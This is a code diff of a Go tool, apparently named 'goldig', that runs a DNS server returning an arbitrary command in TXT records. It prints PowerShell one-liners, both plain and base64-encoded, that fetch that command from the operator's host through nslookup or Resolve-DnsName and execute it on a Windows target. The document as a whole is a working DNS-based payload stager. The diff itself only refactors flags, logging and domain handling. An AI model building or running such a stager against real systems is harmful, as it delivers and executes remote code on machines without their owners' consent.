@@ -3,7 +3,6 @@ package main
 import (
 	"flag"
 	"fmt"
-	"log"
 	"net"
 	"net/netip"
 	"os"
@@ -11,129 +10,102 @@ import (
 	"github.com/phuslu/fastdns"
 )
 
-func banner() {
-	fmt.Println(`
- ██████╗  ██████╗ ██╗     ██████╗ ██╗ ██████╗ 
-██╔════╝ ██╔═══██╗██║     ██╔══██╗██║██╔════╝ 
-██║  ███╗██║   ██║██║     ██║  ██║██║██║  ███╗
-██║   ██║██║   ██║██║     ██║  ██║██║██║   ██║
-╚██████╔╝╚██████╔╝███████╗██████╔╝██║╚██████╔╝
- ╚═════╝  ╚═════╝ ╚══════╝╚═════╝ ╚═╝ ╚═════╝ `)
-	fmt.Print("             by https://gitlab.com/rtfmkiesel\n\n")
-}
-
-func usage() {
-	fmt.Print(`-i	Interface to bind to (default: eth0)
--p	Port to use (default: 53)
--c	Command to serve (default: calc.exe)
--d	Domain to answer to (default: example.com)
--h	Shows this text
-`)
-}
-
+// fastdns struct for the server
 type DNSHandler struct {
-	domain  string
 	command string
 }
 
+// DNS server function
 func (handler *DNSHandler) ServeDNS(rw fastdns.ResponseWriter, req *fastdns.Message) {
 
-	if fmt.Sprint(req.Question.Type) != "PTR" { // ignore PTR for console output
-		log.Printf("Got %s request for %s", req.Question.Type, req.Domain)
+	// ignore PTR for console output
+	if fmt.Sprint(req.Question.Type) != "PTR" {
+		fmt.Printf("Got %s request for %s", req.Question.Type, req.Domain)
 	}
-	// Answer only to the requested domain
-	if string(req.Domain) == handler.domain {
-		switch req.Question.Type {
-		case fastdns.TypeA:
-			fastdns.HOST(rw, req, 60, []netip.Addr{netip.MustParseAddr("127.0.0.1")})
-		case fastdns.TypeTXT:
-			fastdns.TXT(rw, req, 60, handler.command)
-		default:
-			fastdns.Error(rw, req, fastdns.RcodeNXDomain)
-		}
-	} else if fmt.Sprint(req.Question.Type) != "PTR" { // ignore PTR for console output
-		log.Printf("Requested domain %s not known", string(req.Domain))
-		fastdns.Error(rw, req, fastdns.RcodeNXDomain)
-	} else {
+
+	// respond with a TXT record of the selected command
+	switch req.Question.Type {
+	case fastdns.TypeA:
+		fastdns.HOST(rw, req, 60, []netip.Addr{netip.MustParseAddr("127.0.0.1")})
+	case fastdns.TypeTXT:
+		fastdns.TXT(rw, req, 60, handler.command)
+	default:
 		fastdns.Error(rw, req, fastdns.RcodeNXDomain)
 	}
 }
 
+// returns the IPv4 addr of an interface specified by its name
 // https://stackoverflow.com/a/51829730
-func GetIPFromInterface(intfname string) (string, error) {
-	intf, _ := net.InterfaceByName(intfname) // get all interfaces with that name
-	items, _ := intf.Addrs()
+func getIfaceAddr(ifaceName string) (ipAddr string, err error) {
+	// get interface with that name
+	iface, _ := net.InterfaceByName(ifaceName)
+	addrs, _ := iface.Addrs()
 
-	var ip net.IP
-
-	for _, addr := range items { // for all addresses on that interface
+	// for all addresses on that interface
+	for _, addr := range addrs {
+		// switch based on addr type
 		switch v := addr.(type) {
-		case *net.IPNet: // if address type is IP
-			if !v.IP.IsLoopback() { // if address is not loopback
-				if v.IP.To4() != nil { // if address is IPv4
-					ip = v.IP
+		// if address type is IP
+		case *net.IPNet:
+			// if address is not loopback
+			if !v.IP.IsLoopback() {
+				// if address is IPv4
+				if v.IP.To4() != nil {
+					ipAddr = v.IP.String()
 				}
 			}
 		}
 	}
 
-	if ip != nil { // if interface has ip
-		return ip.String(), nil
-
-	} else { // if interface does not have ip
-		return "", fmt.Errorf("interface %s does not exist or does not have an IPv4 address assigned", intfname)
+	// if interface has ip
+	if ipAddr != "" {
+		return ipAddr, nil
+	} else {
+		// if interface does not have ip
+		return "", fmt.Errorf("interface %s does not exist or does not have an IPv4 address assigned", ifaceName)
 	}
 }
 
 func main() {
-
 	// args
-	var intfname string
-	var lport int
-	var command string
-	var domain string
-	var help bool
+	var flagIface string
+	var flagCmd string
+	flag.StringVar(&flagIface, "i", "eth0", "")
+	flag.StringVar(&flagCmd, "c", "calc.exe", "")
+	flag.Usage = func() {
+		fmt.Print(`usage: goldig [OPTIONS]
 
-	flag.StringVar(&intfname, "i", "eth0", "Interface to bind to")
-	flag.IntVar(&lport, "p", 53, "Port to use")
-	flag.StringVar(&command, "c", "calc.exe", "Command to serve")
-	flag.StringVar(&domain, "d", "example.com", "Domain to answer to")
-	flag.BoolVar(&help, "h", false, "Shows help text")
+Options:
+    -i 	Interface to bind to (default: eth0)
+    -c 	Command to serve (default: calc.exe)
+    -h 	Shows this text
+
+`)
+	}
 	flag.Parse()
 
-	if help {
-		banner()
-		usage()
-		os.Exit(0)
-	}
-
-	banner()
-
-	// get IP of interface
-	lhost, err := GetIPFromInterface(intfname)
+	// get IP of the interface
+	lhost, err := getIfaceAddr(flagIface)
 	if err != nil {
-		log.Printf("%s\n", err)
+		fmt.Println(err)
 		os.Exit(1)
 	}
+	addr := lhost + ":53"
+	fmt.Printf("Listening on %s\n", addr)
 
-	addr := fmt.Sprintf("%s:%d", lhost, lport)
-	log.Printf("Listening on %s\n", addr)
-
-	// windows does sot support any other port than 53 with single line nslookup
-	if lport != 53 {
-		log.Printf("'nslookup' oneliners will not work on a different port than 53, you have been warned")
-	} else if len(command) > 255 {
-		log.Printf("Use: powershell . ((resolve-dnsname -server %s -ty TXT %s | select -expandproperty strings) -join \"\")", lhost, domain)
-		log.Printf("Enc: powershell -e ((resolve-dnsname -server %s -ty TXT %s | select -expandproperty strings) -join \"\")", lhost, domain)
+	// switch based on the length of the payload
+	if len(flagCmd) > 255 {
+		fmt.Printf("Use: powershell . ((resolve-dnsname -server %s -ty TXT example.com | select -expandproperty strings) -join \"\")", lhost)
+		fmt.Printf("Enc: powershell -e ((resolve-dnsname -server %s -ty TXT example.com | select -expandproperty strings) -join \"\")", lhost)
 	} else {
-		log.Printf("Use: powershell . (nslookup -q=txt %s %s)[-1]\n", domain, lhost)
-		log.Printf("Enc: powershell -e (nslookup -q=txt %s %s)[-1]\n", domain, lhost)
+		fmt.Printf("Use: powershell . (nslookup -q=txt example.com %s)[-1]\n", lhost)
+		fmt.Printf("Enc: powershell -e (nslookup -q=txt example.com %s)[-1]\n", lhost)
 	}
 
+	// create the server
 	server := &fastdns.Server{
 		Handler: &DNSHandler{
-			command: command,
-			domain:  domain,
+			command: flagCmd,
 		},
 		MaxProcs: 1,
 	}
@@ -141,7 +113,8 @@ func main() {
 	// start server
 	err = server.ListenAndServe(addr)
 	if err != nil {
-		log.Printf("%s\n", err)
+		fmt.Println(err)
+		os.Exit(1)
 	}
 
 }
